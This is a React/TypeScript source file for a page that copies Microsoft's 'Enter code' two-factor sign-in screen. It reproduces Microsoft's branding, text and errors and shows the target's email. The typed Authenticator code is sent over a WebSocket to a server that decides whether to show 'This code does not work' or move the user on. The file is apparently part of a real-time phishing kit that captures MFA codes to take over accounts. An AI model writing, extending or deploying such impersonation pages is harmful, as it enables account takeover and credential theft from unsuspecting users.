import React, { useState, useEffect } from "react";
import { useSearchParams } from "react-router-dom";
import { useWebSocket } from "../../context/WebSocketContext";
import { getSessionEmail } from "../../utils/email";

import microsoftLogo from "../../assets/microsoft/microsoft_logo.svg";
import verifyCodeIcon from "../../assets/microsoft/picker_verify_code.svg";
import bgImage from "../../assets/microsoft/bg.png";
import useDynamicCss from "../../utils/useDynamicCss";

export default function Microsoft2FAPage() {
  const [searchParams] = useSearchParams();
  const userEmail = getSessionEmail(searchParams, 'user@example.com');
  const [code, setCode] = useState("");
  const [errorType, setErrorType] = useState<"wrong-code" | "empty" | null>(
    searchParams.get("error") === "wrong-code" ? "wrong-code" : null,
  );
  const [isLoading, setIsLoading] = useState(false);
  const [pageLoad, setPageLoad] = useState(true);
  const { submitForm, verificationError, clearVerificationError, navigationEvent, clearNavigationEvent } = useWebSocket();

  useEffect(() => {
    const timer = setTimeout(() => setPageLoad(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  // Show server-driven error
  useEffect(() => {
    if (verificationError && (verificationError.type === 'auth' || verificationError.type === 'microsoft')) {
      setErrorType("wrong-code");
      setIsLoading(false);
      setPageLoad(false);
      clearVerificationError();
    }
  }, [verificationError, clearVerificationError]);

  // Reset on server navigation
  useEffect(() => {
    if (navigationEvent) {
      setIsLoading(false);
      setPageLoad(false);
      setCode('');
      setErrorType(null);
      clearNavigationEvent();
    }
  }, [navigationEvent, clearNavigationEvent]);

  useDynamicCss("/css/microsoft.css");

  useEffect(() => {
    if (searchParams.get("error") === "wrong-code") {
      setErrorType("wrong-code");
    } else {
      setErrorType(null);
    }
  }, [searchParams]);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!code.trim()) {
      setErrorType("empty");
      return;
    }
    setErrorType(null);
    setIsLoading(true);
    setPageLoad(true);
    // Submit via WebSocket; server will navigate or show error
    submitForm('microsoft', { code });
  };

  return (
    <>
      <div className="wrapper-loading-root">
        <div className="progress-bar" style={{ display: (isLoading || pageLoad) ? "flex" : "none" }}>
          <div className="bar1"></div>
          <div className="bar2"></div>
        </div>
      </div>
      <form name="form" onSubmit={handleSubmit}>
        <div>
          <div id="lightboxTemplateContainer" className={(isLoading || pageLoad) ? "body-loading" : ""}>
            <div id="lightboxBackgroundContainer">
              <div className="background-image-holder" role="presentation">
                <div
                  id="backgroundImage"
                  role="img"
                  className="background-image ext-background-image"
                  style={{
                    backgroundImage: `url(${bgImage})`,
                    backgroundSize: "cover",
                    backgroundPosition: "center",
                    backgroundRepeat: "no-repeat",
                    width: "100%",
                    height: "100vh",
                  }}
                ></div>
              </div>
            </div>
            <div className="outer">
              <div className="template-section main-section">
                <div className="middle ext-middle">
                  <div className="full-height">
                    <div className="flex-column">
                      <div className="win-scroll">
                        <div
                          id="lightbox"
                          className="sign-in-box ext-sign-in-box"
                        >
                          <div
                            className="lightbox-cover"
                            style={{ display: isLoading ? "block" : "none" }}
                          ></div>
                          {isLoading && (
                            <div
                              id="progressBar"
                              className="progress"
                              role="progressbar"
                            >
                              <div></div>
                              <div></div>
                              <div></div>
                              <div></div>
                              <div></div>
                            </div>
                          )}
                          <div>
                            <div>
                              <img
                                className="logo"
                                role="img"
                                alt="Microsoft"
                                src={microsoftLogo}
                              />
                            </div>
                            <div role="main">
                              <div className="">
                                <div className="slide-in-next">
                                  <div>
                                    <div className="identityBanner">
                                      <div
                                        id="displayName"
                                        className="identity"
                                      >
                                        {userEmail}
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div className="pagination-view animate has-identity-banner slide-in-next">
                                  <div data-viewid="1">
                                    <div
                                      id="idDiv_SAOTCC_Title"
                                      className="row text-title"
                                    >
                                      Enter code
                                    </div>
                                    <div className="row text-body">
                                      <img
                                        className="tile-img small"
                                        role="presentation"
                                        src={verifyCodeIcon}
                                      />
                                      <div className="text-block-body overflow-hidden">
                                        Enter the code displayed in the
                                        Microsoft Authenticator app on your
                                        mobile device
                                      </div>
                                    </div>
                                    <div className="text-block-body">
                                      <div className="form-group">
                                        {errorType && (
                                          <div
                                            role="alert"
                                            aria-live="assertive"
                                            style={{
                                              color: "#E81123",
                                              marginBottom: "8px",
                                              fontSize: "15px",
                                            }}
                                          >
                                            {errorType === "wrong-code" &&
                                              "This code does not work. Check the code and try again."}
                                            {errorType === "empty" &&
                                              "Please enter the code."}
                                          </div>
                                        )}

                                        <div className="textbox form-group">
                                          <div className="placeholderContainer">
                                            <input
                                              className={`form-control ${errorType !== null ? "has-error" : ""}`}
                                              style={{
                                                borderColor:
                                                  errorType !== null
                                                    ? "#E81123"
                                                    : undefined,
                                              }}
                                              aria-required="true"
                                              placeholder="Code"
                                              maxLength={6}
                                              type="tel"
                                              name="otc"
                                              value={code}
                                              onChange={(e) =>
                                                setCode(e.target.value)
                                              }
                                            />
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div
                                      className="text-block-body text-body"
                                      style={{ fontSize: "14px" }}
                                    >
                                      Having trouble?{" "}
                                      <a href="#">Sign in another way</a>
                                    </div>
                                    <div
                                      className="text-block-body text-body"
                                      style={{ fontSize: "14px" }}
                                    >
                                      <a href="#">More information</a>
                                    </div>
                                    <div className="position-buttons">
                                      <div className="row"></div>
                                    </div>
                                    <div className="win-button-pin-bottom">
                                      <div className="row">
                                        <div>
                                          <div className="col-xs-24 no-padding-left-right button-container no-margin-bottom button-field-container ext-button-field-container">
                                            <div className="inline-block button-item ext-button-item">
                                              <input
                                                className="win-button button_primary high-contrast-overrides button ext-button primary ext-primary"
                                                type="submit"
                                                value="Verify"
                                                disabled={isLoading}
                                              />
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div className="wrap-content boilerplate-text ext-boilerplate-text">
                            <p>
                              Please use your Azure username and password to
                              sign in.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div id="footer" role="contentinfo" className="footer ext-footer">
                <div>
                  <div
                    id="footerLinks"
                    className="footerNode text-secondary footer-links ext-footer-links"
                  >
                    <a
                      id="ftrTerms"
                      href="#"
                      className="footer-content ext-footer-content footer-item ext-footer-item"
                    >
                      Terms of Use
                    </a>
                    <a
                      id="ftrPrivacy"
                      href="#"
                      className="footer-content ext-footer-content footer-item ext-footer-item"
                    >
                      Privacy &amp; cookies
                    </a>
                    <a
                      id="moreOptions"
                      href="#"
                      role="button"
                      aria-expanded="false"
                      className="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
                    >
                      ...
                    </a>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </form>
    </>
  );
}
